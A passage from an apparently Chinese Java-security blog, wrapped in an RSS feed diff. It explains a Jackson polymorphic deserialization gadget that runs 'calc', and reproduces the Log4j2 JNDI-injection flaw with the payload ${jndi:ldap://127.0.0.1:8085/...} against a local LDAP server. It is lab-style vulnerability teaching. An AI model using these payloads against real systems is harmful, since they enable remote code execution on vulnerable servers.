+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        this.object = object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String toString() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return &amp;#34;EvilPerson{&amp;#34; +
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;#34;age=&amp;#34; + age +
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;#34;, name=&amp;#39;&amp;#34; + name + &amp;#39;\&amp;#39;&amp;#39; +
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;#34;, object=&amp;#34; + object +
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;#39;}&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EvilPerson evilPerson = new EvilPerson();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    evilPerson.age = 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    evilPerson.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    evilPerson.object = new evil();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//        String json = mapper.writeValueAsString(evilPerson);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//        System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    String json = &amp;#34;{\&amp;#34;age\&amp;#34;:1,\&amp;#34;name\&amp;#34;:\&amp;#34;ygsr\&amp;#34;,\&amp;#34;object\&amp;#34;:{\&amp;#34;@class\&amp;#34;:\&amp;#34;evil\&amp;#34;,\&amp;#34;cmd\&amp;#34;:\&amp;#34;calc\&amp;#34;}}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    EvilPerson person1 = mapper.readValue(json,EvilPerson.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524920456-a7e4be58-6db5-4ed5-8a75-8c27691dc3b7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;通杀&#34;&gt;通杀
+&lt;/h1&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;利用的是Jackson中的PojoNode 他的toString是可以直接触发任意的getter的 触发条件如下&lt;/font&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;不需要存在该属性&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;getter方法需要有返回值&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(51, 51, 51);&#34;&gt;尽可能的只有一个getter&lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;很像fastjson漏洞&lt;/p&gt;
+&lt;p&gt;代码实现&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>Log4j2漏洞原理</title>
+        <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/</link>
+        <pubDate>Wed, 19 Feb 2025 14:32:47 +0800</pubDate>
+        
+        <guid>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/</guid>
+        <description>&lt;img src="https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/0.jpg" alt="Featured image of post Log4j2漏洞原理" /&gt;&lt;h2 id=&#34;基础开发&#34;&gt;基础开发
+&lt;/h2&gt;&lt;h3 id=&#34;环境&#34;&gt;环境
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;jdk8u65&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。&lt;/font&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Log4j2 2.14.1&lt;/li&gt;
+&lt;li&gt;CC 3.2.1 (最好是)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;依赖&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &amp;lt;dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;version&amp;gt;4.12&amp;lt;/version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/dependency&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;代码实现&#34;&gt;代码实现
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logger logger = LogManager.getLogger(LongFunction.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.trace(&amp;#34;trace level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.debug(&amp;#34;debug level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.info(&amp;#34;info level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.warn(&amp;#34;warn level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.error(&amp;#34;error level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.fatal(&amp;#34;fatal level&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc.png&#34;
+	width=&#34;846&#34;
+	height=&#34;136&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc_hu9e6e6ad90b2e5ce99d0da845dc5e524d_29810_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813093505-1eadc89b-8b68-40f8-9e83-5bdc4f8ce2dc_hu9e6e6ad90b2e5ce99d0da845dc5e524d_29810_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;622&#34;
+		data-flex-basis=&#34;1492px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实际开发场景&#34;&gt;实际开发场景
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话，是这样的。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;比如我从数据库获取到了一个 username 为 “Drunkbaby”，我要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       Logger logger = LogManager.getLogger(LongFunction.class);  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; String username = &amp;#34;Drunkbaby&amp;#34;;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; if (username != null) {  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            logger.info(&amp;#34;User {} login in!&amp;#34;, username);  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; }  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        else {  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            logger.error(&amp;#34;User {} not exists&amp;#34;, username);  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; }  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e.png&#34;
+	width=&#34;917&#34;
+	height=&#34;109&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e_hud356f77311ba5f2b9f98d66ef51baf29_14317_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813253366-7d28fac4-a4da-4f97-b8bd-08bd730b222e_hud356f77311ba5f2b9f98d66ef51baf29_14317_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;841&#34;
+		data-flex-basis=&#34;2019px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析
+&lt;/h2&gt;&lt;h3 id=&#34;影响版本&#34;&gt;影响版本
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;2.x &amp;lt;= log4j &amp;lt;= 2.15.0-rc1&lt;/font&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b.png&#34;
+	width=&#34;584&#34;
+	height=&#34;145&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b_hu0f424c4da169b4f6833e04c395f6f4bc_9829_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813388983-130041d0-9f96-4ca8-b07e-df8734bce32b_hu0f424c4da169b4f6833e04c395f6f4bc_9829_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;402&#34;
+		data-flex-basis=&#34;966px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;username是我们可控的&lt;/p&gt;
+&lt;p&gt;尝试输入其他的&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;username=&amp;quot;${java:os}&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf.png&#34;
+	width=&#34;1136&#34;
+	height=&#34;54&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf_hu6512dddc1d0d08b7a55d73f3e9b1ee5a_13724_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813432071-d65b633c-7167-475e-96af-aa55a7eff8cf_hu6512dddc1d0d08b7a55d73f3e9b1ee5a_13724_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;2103&#34;
+		data-flex-basis=&#34;5048px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;结果并不是直接输出&lt;code&gt;java:os&lt;/code&gt;,而是输出了操作系统的一些信息&lt;/p&gt;
+&lt;p&gt;而这里存在lookeup,从而导致JNDI注入漏洞&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现
+&lt;/h3&gt;&lt;p&gt;用yakit开一个ldap服务&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String name =&amp;#34;${jndi:ldap://127.0.0.1:8085/XFaOTtBf}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    if (name != null)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.info(&amp;#34;User {} is logging&amp;#34;,name);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    else
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        logger.error(&amp;#34;User {} not exist&amp;#34;,name);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18.png&#34;
+	width=&#34;1010&#34;
+	height=&#34;692&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18_huc7fab8967462f4dd4aa358b9636ff2a2_75493_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733813616917-c56430b7-5244-43c5-9e18-9146a00eec18_huc7fab8967462f4dd4aa358b9636ff2a2_75493_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;145&#34;
+		data-flex-basis=&#34;350px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;debug代码调试&#34;&gt;debug代码调试
+&lt;/h3&gt;&lt;p&gt;断点打在&lt;code&gt;PatternLayout.toSerializable&lt;/code&gt;下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d.png&#34;
+	width=&#34;836&#34;
+	height=&#34;318&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d_hued8d14dca2b5d859da075c8ca2a81349_47751_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816545661-dba550fa-17ce-4cc7-9211-c46c936e496d_hued8d14dca2b5d859da075c8ca2a81349_47751_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;262&#34;
+		data-flex-basis=&#34;630px&#34;
+	
+&gt;&lt;/p&gt;
